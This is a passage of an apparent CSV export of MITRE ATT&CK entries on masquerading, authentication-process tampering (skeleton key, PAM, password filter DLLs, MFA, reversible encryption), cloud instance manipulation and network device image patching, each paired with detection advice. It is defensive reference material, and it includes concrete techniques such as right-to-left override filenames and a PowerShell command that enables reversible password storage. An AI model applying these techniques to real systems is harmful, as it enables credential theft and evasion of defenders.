Unit 42 NOKKI Sept 2018),(Citation: Dell TG-3390),(Citation: ESET Bad Rabbit),(Citation: Symantec Remsec IOCs),(Citation: Microsoft DUBNIUM June 2016),(Citation: ESET LightNeuron May 2019),(Citation: NCC Group Team9 June 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1036.003,attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b,Masquerading: Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke),https://attack.mitre.org/techniques/T1036/003,10 February 2020,14 September 2023,enterprise-attack,1.1,Defense Evasion,"If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)","Linux, Windows, macOS","Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Metadata",True,T1036,,,,,,,,"(Citation: Twitter ItsReallyNick APT32 pubprn Masquerade),(Citation: FireEye APT10 Sept 2018),(Citation: Kaspersky Lyceum October 2021),(Citation: Qualys LolZarus),(Citation: F-Secure CozyDuke),(Citation: Cybereason Soft Cell June 2019),"
T1036.002,attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69,Masquerading: Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)

Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",https://attack.mitre.org/techniques/T1036/002,10 February 2020,14 October 2021,enterprise-attack,1.1,Defense Evasion,"Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\u202E</code>, <code>[U+202E]</code>, and <code>%E2%80%AE</code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.","Linux, Windows, macOS",File: File Metadata,True,T1036,,,,,,,,"(Citation: Scarlet Mimic Jan 2016),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro Tick November 2019),(Citation: TrendMicro BlackTech June 2017),"
T1036.006,attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86,Masquerading: Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).

Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",https://attack.mitre.org/techniques/T1036/006,10 February 2020,30 March 2023,enterprise-attack,1.0,Defense Evasion,"It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.","Linux, macOS",File: File Metadata,True,T1036,,"Erye Hernandez, Palo Alto Networks",User,,,,,"(Citation: synack 2016 review),"
T1556.001,attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605,Modify Authentication Process: Domain Controller Authentication,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. 

Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",https://attack.mitre.org/techniques/T1556/001,11 February 2020,20 April 2021,enterprise-attack,2.0,"Credential Access, Defense Evasion, Persistence","Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)

Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). ",Windows,"File: File Modification, Logon Session: Logon Session Creation, Process: OS API Execution, Process: Process Access",True,T1556,,,Administrator,,,,,"(Citation: Dell Skeleton),(Citation: Cycraft Chimera April 2020),(Citation: TechNet Least Privilege),(Citation: Microsoft Securing Privileged Access),(Citation: TechNet Credential Theft),(Citation: Microsoft LSA)"
T1556.007,attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f,Modify Authentication Process: Hybrid Identity,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  

Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):

* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud 
* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory 
* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD 

AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. 

By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)

In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",https://attack.mitre.org/techniques/T1556/007,28 September 2022,21 October 2022,enterprise-attack,1.0,"Credential Access, Defense Evasion, Persistence",,"Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","Application Log: Application Log Content, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load",True,T1556,,Praetorian,,,,,,"(Citation: MagicWeb),(Citation: AADInternals Azure AD On-Prem to Cloud),(Citation: MagicWeb),(Citation: Mandiant Azure AD Backdoors)"
T1556.006,attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc,Modify Authentication Process: Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.

Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)

For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 

Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) ",https://attack.mitre.org/techniques/T1556/006,31 May 2022,16 October 2023,enterprise-attack,1.1,"Credential Access, Defense Evasion, Persistence",,"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Active Directory: Active Directory Object Modification, Logon Session: Logon Session Creation, User Account: User Account Authentication, User Account: User Account Modification",True,T1556,Multi-Factor Authentication,"Liran Ravich, CardinalOps; Muhammad Moiz Arshad, @5T34L7H",,,,,,",(Citation: Mandiant Cloudy Logs 2023)"
T1556.004,attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd,Modify Authentication Process: Network Device Authentication,"Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.

[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",https://attack.mitre.org/techniques/T1556/004,19 October 2020,14 December 2021,enterprise-attack,2.0,"Credential Access, Defense Evasion, Persistence","Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)

Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601).",Network,File: File Modification,True,T1556,,,Administrator,,,,,"(Citation: Mandiant - Synful Knock),(Citation: Cisco IOS Software Integrity Assurance - TACACS)"
T1556.008,attack-pattern--90c4a591-d02d-490b-92aa-619d9701ac04,Modify Authentication Process: Network Provider DLL,"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) 

Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)

Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",https://attack.mitre.org/techniques/T1556/008,30 March 2023,04 May 2023,enterprise-attack,1.0,"Credential Access, Defense Evasion, Persistence",,Windows,"File: File Creation, Process: OS API Execution, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1556,,CrowdStrike Falcon OverWatch; Jai Minton,,,,,,",(Citation: EnableMPRNotifications)"
T1556.002,attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42,Modify Authentication Process: Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. 

Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. 

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",https://attack.mitre.org/techniques/T1556/002,11 February 2020,20 April 2021,enterprise-attack,2.0,"Credential Access, Defense Evasion, Persistence","Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>) and correlate then investigate the DLL files these files reference.

Password filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)",Windows,"File: File Creation, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1556,,Vincent Le Toux,"Administrator, SYSTEM",,,,,"(Citation: Kaspersky ProjectSauron Full Report),"
T1556.003,attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771,Modify Authentication Process: Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",https://attack.mitre.org/techniques/T1556/003,26 June 2020,17 October 2021,enterprise-attack,2.0,"Credential Access, Defense Evasion, Persistence","Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.

Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","Linux, macOS","File: File Modification, Logon Session: Logon Session Creation",True,T1556,,"George Allen, VMware Carbon Black; Scott Knight, @sdotknight, VMware Carbon Black",root,,,,,"(Citation: ESET Ebury Oct 2017),(Citation: Trend Micro Skidmap),"
T1556.005,attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48,Modify Authentication Process: Reversible Encryption,"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",https://attack.mitre.org/techniques/T1556/005,13 January 2022,10 February 2022,enterprise-attack,1.0,"Credential Access, Defense Evasion, Persistence","Monitor property changes in Group Policy: <code>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.

Monitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. 

Monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)",Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, Script: Script Execution, User Account: User Account Metadata",True,T1556,,,"Administrator, User",,,,,",(Citation: TechNet Least Privilege),(Citation: Microsoft Securing Privileged Access),(Citation: store_pwd_rev_enc),(Citation: TechNet Credential Theft)"
T1578.002,attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c,Modify Cloud Compute Infrastructure: Create Cloud Instance,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)

Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",https://attack.mitre.org/techniques/T1578/002,14 May 2020,08 March 2021,enterprise-attack,1.1,Defense Evasion,"The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.

In AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances</code> event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create</code> to create a VM.(Citation: Cloud Audit Logs)",IaaS,"Instance: Instance Creation, Instance: Instance Metadata",True,T1578,,,User,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: Mandiant M-Trends 2020)"
T1578.001,attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1,Modify Cloud Compute Infrastructure: Create Snapshot,"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.

An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",https://attack.mitre.org/techniques/T1578/001,09 June 2020,08 March 2021,enterprise-attack,1.1,Defense Evasion,"The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.

In AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).

In Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)

Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create</code> command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the <code>""sourceSnapshot"":</code> parameter pointed to <code>""global/snapshots/[BOOT_SNAPSHOT_NAME]</code>.(Citation: GCP - Creating and Starting a VM)",IaaS,"Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata",True,T1578,,Praetorian,User,,,,,"(Citation: GitHub Pacu),(Citation: Mandiant M-Trends 2020)"
T1578.003,attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4,Modify Cloud Compute Infrastructure: Delete Cloud Instance,"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.

An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",https://attack.mitre.org/techniques/T1578/003,16 June 2020,08 March 2021,enterprise-attack,1.1,Defense Evasion,"The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.

In AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances</code> event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete</code> to delete a VM.(Citation: Cloud Audit Logs)",IaaS,"Instance: Instance Deletion, Instance: Instance Metadata",True,T1578,,,User,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant M-Trends 2020)"
T1578.005,attack-pattern--ca00366b-83a1-4c7b-a0ce-8ff950a7c87f,Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations,"Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.

For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim’s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)

Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535). In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant.(Citation: Microsoft Peach Sandstorm 2023) This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Azure Policy) (Citation: Microsoft Subscription Hijacking 2022)",https://attack.mitre.org/techniques/T1578/005,05 September 2023,02 October 2023,enterprise-attack,1.0,Defense Evasion,,IaaS,Cloud Service: Cloud Service Modification,True,T1578,,"Amir Gharib, Microsoft Threat Intelligence; Blake Strom, Microsoft Threat Intelligence",,,,,,","
T1578.004,attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1,Modify Cloud Compute Infrastructure: Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.

Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",https://attack.mitre.org/techniques/T1578/004,16 June 2020,08 March 2021,enterprise-attack,1.1,Defense Evasion,"Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",IaaS,"Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop",True,T1578,,Netskope,User,,,,,","
T1601.002,attack-pattern--fc74ba38-dc98-461f-8611-b3dbf9978e3d,Modify System Image: Downgrade System Image,"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)

On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.

Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  ",https://attack.mitre.org/techniques/T1601/002,19 October 2020,22 October 2020,enterprise-attack,1.0,Defense Evasion,"Many embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. ",Network,File: File Modification,True,T1601,,,Administrator,,,,,",(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: NIST 800-63-3)"
T1601.001,attack-pattern--d245808a-7086-4310-984a-a84aaaa43f8f,Modify System Image: Patch System Image,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.

To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.

To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.

In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.

By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).

